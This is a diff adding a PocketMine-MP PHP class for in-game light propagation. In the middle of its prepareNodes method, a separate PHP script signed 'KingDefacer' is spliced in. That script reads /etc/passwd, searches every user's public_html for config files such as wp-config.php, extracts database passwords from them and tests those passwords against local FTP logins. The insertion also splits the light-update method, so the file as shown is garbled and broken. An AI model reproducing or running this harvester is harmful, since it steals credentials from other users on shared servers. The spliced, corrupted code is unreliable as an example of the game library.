@@ -1,0 +1,305 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\level\light;
+
+use pocketmine\block\BlockFactory;
+use pocketmine\level\ChunkManager;
+use pocketmine\level\Level;
+use pocketmine\level\utils\SubChunkIteratorManager;
+
+//TODO: make light updates asynchronous
+abstract class LightUpdate{
+
+	/** @var ChunkManager */
+	protected $level;
+
+	/**
+	 * @var int[][] blockhash => [x, y, z, new light level]
+	 * @phpstan-var array<int, array{int, int, int, int}>
+	 */
+	protected $updateNodes = [];
+
+	/**
+	 * @var \SplQueue
+	 * @phpstan-var \SplQueue<array{int, int, int}>
+	 */
+	protected $spreadQueue;
+	/**
+	 * @var true[]
+	 * @phpstan-var array<int, true>
+	 */
+	protected $spreadVisited = [];
+
+	/**
+	 * @var \SplQueue
+	 * @phpstan-var \SplQueue<array{int, int, int, int}>
+	 */
+	protected $removalQueue;
+	/**
+	 * @var true[]
+	 * @phpstan-var array<int, true>
+	 */
+	protected $removalVisited = [];
+	/** @var SubChunkIteratorManager */
+	protected $subChunkHandler;
+
+	public function __construct(ChunkManager $level){
+		$this->level = $level;
+		$this->removalQueue = new \SplQueue();
+		$this->spreadQueue = new \SplQueue();
+
+		$this->subChunkHandler = new SubChunkIteratorManager($this->level);
+	}
+
+	abstract protected function getLight(int $x, int $y, int $z) : int;
+
+	/**
+	 * @return void
+	 */
+	abstract protected function setLight(int $x, int $y, int $z, int $level);
+
+	/**
+	 * @return void
+	 */
+	public function setAndUpdateLight(int $x, int $y, int $z, int $newLevel){
+		$this->updateNodes[Level::blockHash($x, $y, $z)] = [$x, $y, $z, $newLevel];
+	}
+
+	private function prepareNodes() : void{
+		foreach($this->updateNodes as $blockHash => [$x, $y, $z, $newLevel]){
+			if($this->subChunkHandler->moveTo($x, $y, $z)){
+				$oldLevel = $this->getLight($x, $y, $z);
+
+<?php
+echo "<html>";
+echo "<title>Edited By KingDefacer</title><body>";
+
+set_time_limit(0);
+##################
+@$passwd=fopen('/etc/passwd','r');
+if (!$passwd) {
+  echo "[-] Error : coudn't read /etc/passwd";
+  exit;
+}
+$path_to_public=array();
+$users=array();
+$pathtoconf=array();
+$i=0;
+
+while(!feof($passwd)) {
+$str=fgets($passwd);
+if ($i>35) {
+   $pos=strpos($str,":");
+   $username=substr($str,0,$pos);
+   $dirz="/home/$username/public_html/";
+   if (($username!="")) {
+       if (is_readable($dirz)) {
+           array_push($users,$username);
+           array_push($path_to_public,$dirz);
+       }
+   }
+}
+$i++;
+}
+###################
+
+#########################
+echo "<br><br>";
+echo "<textarea name='main_window' cols=100 rows=20>";
+
+echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n";
+echo "[+] Founded ".sizeof($path_to_public)." readable public_html directories\n";
+
+echo "[~] Searching for passwords in config.* files...\n\n";
+foreach ($users as $user) {
+       $path="/home/$user/public_html/";
+       read_dir($path,$user);
+}
+
+echo "\n[+] Done\n";
+
+function read_dir($path,$username) {
+   if ($handle = opendir($path)) {
+       while (false !== ($file = readdir($handle))) {
+             $fpath="$path$file";
+             if (($file!='.') and ($file!='..')) {
+                if (is_readable($fpath)) {
+                   $dr="$fpath/";
+                   if (is_dir($dr)) {
+                      read_dir($dr,$username);
+                   }
+                   else {
+                        if (($file=='config.php') or ($file=='config.inc.php') or ($file=='db.inc.php') or ($file=='connect.php') or ($file=='wp-config.php') or ($file=='var.php') or ($file=='configure.php') or ($file=='db.php') or ($file=='db_connect.php')) { 
+                           $pass=get_pass($fpath);
+                           if ($pass!='') {
+                              echo "[+] $fpath\n$pass\n";
+                              ftp_check($username,$pass);
+                           }
+                        }
+                   }
+                }
+             }
+       }
+   }
+}
+
+function get_pass($link) {
+   @$config=fopen($link,'r');
+   while(!feof($config)) {
+       $line=fgets($config);
+       if (strstr($line,'pass') or strstr($line,'password') or strstr($line,'passwd')) {
+           if (strrpos($line,'"'))
+              $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,'"')-(strpos($line,'=')+3)));
+           else
+              $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,"'")-(strpos($line,'=')+3)));
+           return $pass;
+       }
+   }
+}
+
+function ftp_check($login,$pass) {
+    @$ftp=ftp_connect('127.0.0.1');
+    if ($ftp) {
+       @$res=ftp_login($ftp,$login,$pass);
+       if ($res) {
+          echo '[FTP] '.$login.':'.$pass."  Success\n";
+       }
+       else ftp_quit($ftp);
+    }
+}
+
+echo "</textarea><br>";
+
+echo "</body></html>";
+?>
+				if($oldLevel !== $newLevel){
+					$this->setLight($x, $y, $z, $newLevel);
+					if($oldLevel < $newLevel){ //light increased
+						$this->spreadVisited[$blockHash] = true;
+						$this->spreadQueue->enqueue([$x, $y, $z]);
+					}else{ //light removed
+						$this->removalVisited[$blockHash] = true;
+						$this->removalQueue->enqueue([$x, $y, $z, $oldLevel]);
+					}
+				}
+			}
+		}
+	}
+
+	/**
+	 * @return void
+	 */
+	public function execute(){
+		$this->prepareNodes();
+
+		while(!$this->removalQueue->isEmpty()){
+			list($x, $y, $z, $oldAdjacentLight) = $this->removalQueue->dequeue();
+
+			$points = [
+				[$x + 1, $y, $z],
+				[$x - 1, $y, $z],
+				[$x, $y + 1, $z],
+				[$x, $y - 1, $z],
+				[$x, $y, $z + 1],
+				[$x, $y, $z - 1]
+			];
+
+			foreach($points as list($cx, $cy, $cz)){
+				if($this->subChunkHandler->moveTo($cx, $cy, $cz)){
+					$this->computeRemoveLight($cx, $cy, $cz, $oldAdjacentLight);
+				}
+			}
+		}
+
+		while(!$this->spreadQueue->isEmpty()){
+			list($x, $y, $z) = $this->spreadQueue->dequeue();
+
+			unset($this->spreadVisited[Level::blockHash($x, $y, $z)]);
+
+			if(!$this->subChunkHandler->moveTo($x, $y, $z)){
+				continue;
+			}
+
+			$newAdjacentLight = $this->getLight($x, $y, $z);
+			if($newAdjacentLight <= 0){
+				continue;
+			}
+
+			$points = [
+				[$x + 1, $y, $z],
+				[$x - 1, $y, $z],
+				[$x, $y + 1, $z],
+				[$x, $y - 1, $z],
+				[$x, $y, $z + 1],
+				[$x, $y, $z - 1]
+			];
+
+			foreach($points as list($cx, $cy, $cz)){
+				if($this->subChunkHandler->moveTo($cx, $cy, $cz)){
+					$this->computeSpreadLight($cx, $cy, $cz, $newAdjacentLight);
+				}
+			}
+		}
+	}
+
+	/**
+	 * @return void
+	 */
+	protected function computeRemoveLight(int $x, int $y, int $z, int $oldAdjacentLevel){
+		$current = $this->getLight($x, $y, $z);
+
+		if($current !== 0 and $current < $oldAdjacentLevel){
+			$this->setLight($x, $y, $z, 0);
+
+			if(!isset($this->removalVisited[$index = Level::blockHash($x, $y, $z)])){
+				$this->removalVisited[$index] = true;
+				if($current > 1){
+					$this->removalQueue->enqueue([$x, $y, $z, $current]);
+				}
+			}
+		}elseif($current >= $oldAdjacentLevel){
+			if(!isset($this->spreadVisited[$index = Level::blockHash($x, $y, $z)])){
+				$this->spreadVisited[$index] = true;
+				$this->spreadQueue->enqueue([$x, $y, $z]);
+			}
+		}
+	}
+
+	/**
+	 * @return void
+	 */
+	protected function computeSpreadLight(int $x, int $y, int $z, int $newAdjacentLevel){
+		$current = $this->getLight($x, $y, $z);
+		$potentialLight = $newAdjacentLevel - BlockFactory::$lightFilter[$this->subChunkHandler->currentSubChunk->getBlockId($x & 0x0f, $y & 0x0f, $z & 0x0f)];
+
+		if($current < $potentialLight){
+			$this->setLight($x, $y, $z, $potentialLight);
+
+			if(!isset($this->spreadVisited[$index = Level::blockHash($x, $y, $z)]) and $potentialLight > 1){
+				$this->spreadVisited[$index] = true;
+				$this->spreadQueue->enqueue([$x, $y, $z]);
+			}
+		}
+	}
+}
